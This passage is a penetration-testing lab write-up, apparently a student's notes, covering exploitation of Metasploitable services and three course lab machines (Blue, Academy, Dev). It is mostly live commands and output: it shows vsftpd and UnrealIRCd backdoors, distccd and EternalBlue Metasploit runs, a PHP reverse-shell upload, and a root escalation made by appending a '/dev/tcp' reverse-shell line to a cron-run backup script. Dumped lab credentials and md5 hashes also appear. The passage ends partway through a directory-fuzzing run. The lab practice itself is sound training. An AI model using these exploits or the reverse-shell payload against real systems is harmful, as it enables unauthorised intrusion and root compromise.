┌──(user㉿kaliCEF98)-[~]
└─$ searchsploit vsftpd 2.3.4
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution               | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  | unix/remote/17491.rb
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results


┌──(user㉿kaliCEF98)-[~]
└─$ searchsploit -m 49757    
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
File Type: Python script, ASCII text executable

Copied to: /home/user/49757.py


┌──(user㉿kaliCEF98)-[~/Bureau/metaslpoitable]
└─$ python3 49757.py 192.168.20.23
Success, shell opened
Send `exit` to quit shell
id
uid=0(root) gid=0(root)
```

Then to spawn a better shell : 
```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/Bureau/metaslpoitable]
└─$ python3 49757.py 192.168.20.23
Success, shell opened
Send `exit` to quit shell

python3 -c "import pty;pty.spawn('/bin/bash')" || python -c "import pty;pty.spawn('/bin/bash')"
root@metasploitable:/# 
```

That was the easy way, we can also exploit this manually.

For this, we need two shell

on the 1st one :  `ftp IPADDRESS` \
**username** : you can put anything as long as it ends with an emoji \
**Password** can be empty

```terminal {title="bash"}
$ ftp 10.1.1.36
Connected to 10.1.1.36.
220 (vsFTPd 2.3.4)
Name (10.1.1.36:user): wemy:)
331 Please specify the password.
Password: 
```

 and on the 2nd  : `nc -vvn IPADDRESS 6200`
 
```terminal {title="bash"}
┌──(user㉿KaliHTB)-[~]
└─$ nc -vvn 10.1.1.36 6200                                            1 ⨯
(UNKNOWN) [10.1.1.36] 6200 (?) open
id
uid=0(root) gid=0(root)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

![](IMG/AT3C3_Sec_img_70.png)

---

### Port 1524 - Bindshell

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~/Bureau/metaslpoitable]
└─$ nc 192.168.20.23 1524                                                                                                                                   1 ⨯
root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)

root@metasploitable:/# 
```

🤣

---

### Port 3306 - MySQL

```terminal {title="bash"}
┌──(user㉿KaliHTB)-[~]
└─$ mysql -u root -h 10.1.1.36    
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
7 rows in set (0.001 sec)

MySQL [(none)]> use dvwa;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MySQL [dvwa]> show tables;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
2 rows in set (0.000 sec)

MySQL [dvwa]> select * from users;
+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
| user_id | first_name | last_name | user    | password                         | avatar                                                |
+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   |
|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg |
|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    |
|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   |
|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  |
+---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
5 rows in set (0.001 sec)

MySQL [dvwa]>  selecct * from users;
```

logged as root mysql without password \
and all the password are stored in simple md5 in the database: 

![](IMG/AT3C3_Sec_img_83.png)

<br>
---

### Port 3632 - distccd

```terminal {title="bash"}
msf6 > search distccd

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec

msf6 > use 0
msf6 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   3632             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 10.1.1.36
RHOSTS => 10.1.1.36
msf6 exploit(unix/misc/distcc_exec) > set LHOST eth0
LHOST => eth0
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/misc/distcc_exec) > exploit

[*] Started reverse TCP double handler on 10.1.1.19:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 3IDiQVzbch0EIFU9;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "3IDiQVzbch0EIFU9\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.1.1.19:4444 -> 10.1.1.36:42196 ) at 2022-01-22 15:48:07 +0100

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

```

great, but we are not root yet


---

### Port 6667 - UnrealIRCd

```terminal {title="bash"}
msf6 exploit(unix/misc/distcc_exec) > search ircd

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor

msf6 exploit(unix/misc/distcc_exec) > use 0
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.20.23
RHOSTS => 192.168.20.23
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.20.168
LHOST => 192.168.20.168
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP double handler on 192.168.20.168:4444 
[*] 192.168.20.23:6667 - Connected to 192.168.20.23:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.20.23:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo M2Nmv2rapoOsNzOV;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "M2Nmv2rapoOsNzOV\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 6 opened (192.168.20.168:4444 -> 192.168.20.23:44528 ) at 2021-10-19 15:47:43 +0200


bash -i
bash: no job control in this shell
root@metasploitable:/etc/unreal# id
uid=0(root) gid=0(root)
root@metasploitable:/etc/unreal#
```


<br>

---

<br>



# Vulnerable Machines

Excelent timing, the [Practical Ethical Hacking - The Complete Course](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course)  was free to grab during this week. \
So to practice, every one tried to root the machine on their own. \

> Note : \
> I rooted these machines on my own. \
> I watched the write-up afterward and noticed the way I did it to be pretty similar to how they are solved in the course. \

<br>

## Machine - Blue


Initial scan

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ nmap -sC -sV --script vuln 192.168.20.23            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 10:46 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.20.23
Host is up (0.00049s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.54 seconds
```

exploit

```terminal {title="bash"}
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_psexec) > options
Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                           Required  Description
   ----                  ---------------                           --------  -----------
   DBGTRACE              false                                     yes       Show extra debug trace info
   LEAKATTEMPTS          99                                        yes       How many times to try to leak transaction
   NAMEDPIPE                                                       no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wor  yes       List of named pipes to check
                         dlists/named_pipes.txt
   RHOSTS                                                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/w
                                                                             iki/Using-Metasploit
   RPORT                 445                                       yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                             no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                            no        The service display name
   SERVICE_NAME                                                    no        The service name
   SHARE                 ADMIN$                                    yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a norm
                                                                             al read/write folder share
   SMBDomain             .                                         no        The Windows domain to use for authentication
   SMBPass                                                         no        The password for the specified username
   SMBUser                                                         no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.20.168   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.20.23
RHOSTS => 192.168.20.23
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 192.168.20.168:4444 
[*] 192.168.20.23:445 - Target OS: Windows 7 Ultimate 7601 Service Pack 1
[*] 192.168.20.23:445 - Built a write-what-where primitive...
[+] 192.168.20.23:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.20.23:445 - Selecting PowerShell target
[*] 192.168.20.23:445 - Executing the payload...
[+] 192.168.20.23:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 192.168.20.23
[*] Meterpreter session 1 opened (192.168.20.168:4444 -> 192.168.20.23:49175 ) at 2021-10-20 10:54:44 +0200

meterpreter > shell
Process 1444 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

it's that simple, straight to `nt authority\system` \
It was not really a challenge but more of a demonstration on how an unpatched OS can be pawned in just a few "clicks"

<br>

---

## Machine - Academy


Initial scan

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ nmap -A -Pn 192.168.20.22
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 11:49 CEST
Nmap scan report for 192.168.20.22
Host is up (0.0034s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30 03:13 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.20.168
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

we can see that Anonymous FTP login are allowed and that there's a file `note.txt` \
Let's `GET` it

```terminal {title="bash"}
└─$ ftp 192.168.20.22
Connected to 192.168.20.22.
220 (vsFTPd 3.0.3)
Name (192.168.20.22:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30 03:13 note.txt
226 Directory send OK.

ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (776 bytes).
226 Transfer complete.
776 bytes received in 0.00 secs (246.2829 kB/s)

ftp> 
```

Here's the content

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ cat note.txt
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```

So we have a password : \
md5 hash : `cd73502828457d15655bbd7a63fb0bc8` = `student` 

Now, let's look at port 80

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ gobuster dir -u http://192.168.20.22 -w /usr/share/wordlists/dirb/big.txt   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.20.22
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/20 12:01:04 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/academy              (Status: 301) [Size: 316] [--> http://192.168.20.22/academy/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://192.168.20.22/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]                                       
                                                                                      
===============================================================
2021/10/20 12:01:05 Finished
===============================================================
```

now fuzzing `/academy`

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ gobuster dir -u http://192.168.20.22/academy -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.20.22/academy
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/20 15:46:54 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 322] [--> http://192.168.20.22/academy/admin/]
/assets               (Status: 301) [Size: 323] [--> http://192.168.20.22/academy/assets/]
/db                   (Status: 301) [Size: 319] [--> http://192.168.20.22/academy/db/]    
/includes             (Status: 301) [Size: 325] [--> http://192.168.20.22/academy/includes/]
                                                                                            
===============================================================
2021/10/20 15:46:55 Finished
===============================================================
```

Looking arround, I found this : \
http://192.168.20.22/academy/db/onlinecourse.sql

```sql
INSERT INTO `admin` (`id`, `username`, `password`, `creationDate`, `updationDate`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '2020-01-24 16:21:18', '03-06-2020 07:09:07 PM');
```

Another password \
md5 hash : `21232f297a57a5a743894a0e4a801fc3` = `admin`

Now we can login as admin : http://192.168.20.22/academy/admin/ \
user : 	`admin` \
password: `admin`

We can't do much, except changing users passwords. Something we don't need to do since we already found one user's id and password. \
let's tyr to log in as this user

Reg No: `10201321` \
password : `student`

on the profile page, we can uplaod a profile photo : http://192.168.20.22/academy/my-profile.php

it looks like it's accepting files with any extension.

Let's uplaod a reverse php shell : https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Before clicking "save", we need to open a listener.

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ nc -nvlp 7777                 
listening on [any] 7777 ...
connect to [192.168.20.168] from (UNKNOWN) [192.168.20.22] 60324
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 06:19:01 up 36 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                05:42   32:21   0.00s  0.00s -bash
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ bash -i
bash: cannot set terminal process group (432): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/$
```

Nice, shell as `www-data`

**PrivEsc** 

Running [LinPEAS](https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)

```terminal {title="bash"}
[...]
╔══════════╣ Searching passwords in config PHP files
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['ShowChgPassword'] = true;
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_password = "My_V3ryS3cur3_P4ss";
[...]
```

looks like it found a password in a config file, let's `cat` the full file.

```php
www-data@academy:/var/www/html/academy/includes$ cat config.php
cat config.php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
```

so we got an user and a password: `grimmie`:`My_V3ryS3cur3_P4ss`

It says that it's for mysql, but trying the same password for ssh is worth a try

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ ssh grimmie@192.168.20.22
grimmie@192.168.20.22's password:
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May 30 03:21:39 2021 from 192.168.10.31
grimmie@academy:~$ 
```

bingo

**ROOT**

Another interesting thing LinPEAS found is a backup script `/home/grimmie/backup.sh` in the cron tab that is owned by `grimmie` but run as root every minutes. \
so we can modify this script to pop a shell as root.

The payload


```terminal {title="bash"}
bash -i >& /dev/tcp/192.168.20.101/8000 0>&1  
```

<br>

adding the the payload at the end of `/home/grimmie/backup.sh`

```terminal {title="bash"}
grimmie@academy:/tmp$ cat /home/grimmie/backup.sh 
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
bash -i >& /dev/tcp/192.168.20.101/8000 0>&1 
```

Now we just need to open a listener  on the same port and wait for the cron to run.

```terminal {title="bash"}
┌──(user㉿kaliCEF98)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.20.168] from (UNKNOWN) [192.168.20.22] 52522
id
uid=0(root) gid=0(root) groups=0(root)
bash -i
bash: cannot set terminal process group (30303): Inappropriate ioctl for device
bash: no job control in this shell
root@academy:~# cd /root
cd /root
root@academy:~# ls
ls
flag.txt
root@academy:~# cat flag.txt	
cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !
root@academy:~# 
```

---

<br>

## Machine - Dev


Initial scan

```terminal {title="bash"}
┌──(user㉿KaliHTB)-[~]
└─$ nmap -Pn -A -p- 10.1.1.34            
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-20 20:35 CEST
Nmap scan report for 10.1.1.34
Host is up (0.0016s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33740/udp   mountd
|   100005  1,2,3      43958/udp6  mountd
|   100005  1,2,3      50539/tcp6  mountd
|   100005  1,2,3      59219/tcp   mountd
|   100021  1,3,4      37039/tcp6  nlockmgr
|   100021  1,3,4      39033/tcp   nlockmgr
|   100021  1,3,4      48386/udp   nlockmgr
|   100021  1,3,4      51820/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
39033/tcp open  nlockmgr 1-4 (RPC #100021)
41089/tcp open  mountd   1-3 (RPC #100005)
54175/tcp open  mountd   1-3 (RPC #100005)
59219/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.75 seconds
```

running on port **80**

![](IMG/AT3C3_Sec_img_15.png)

```terminal {title="bash"}
┌──(user㉿KaliHTB)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.1.1.34/FUZZ                                                                                                         130 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.1.1.34/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

app                     [Status: 301, Size: 304, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
extensions              [Status: 301, Size: 311, Words: 20, Lines: 10]
public                  [Status: 301, Size: 307, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10]
src                     [Status: 301, Size: 304, Words: 20, Lines: 10]
vendor                  [Status: 301, Size: 307, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 102 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

looking around, the only interesting thing I found was a config file with a username and password: 

http://10.1.1.34/app/config/config.yml

```terminal {title="bash"}
┌──(user㉿KaliHTB)-[~]
└─$ curl http://10.1.1.34/app/config/config.yml
# Database setup. The driver can be either 'sqlite', 'mysql' or 'postgres'.
#
# For SQLite, only the databasename is required. However, MySQL and PostgreSQL
# also require 'username', 'password', and optionally 'host' ( and 'port' ) if the database
# server is not on the same host as the web server.
#
# If you're trying out Bolt, just keep it set to SQLite for now.
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java
[...]
```
    
 username: `bolt` \
 password: `I_love_java`

port **8080**

```terminal {title="bash"}
┌──(user㉿KaliHTB)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.1.1.34:8080/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.1.1.34:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
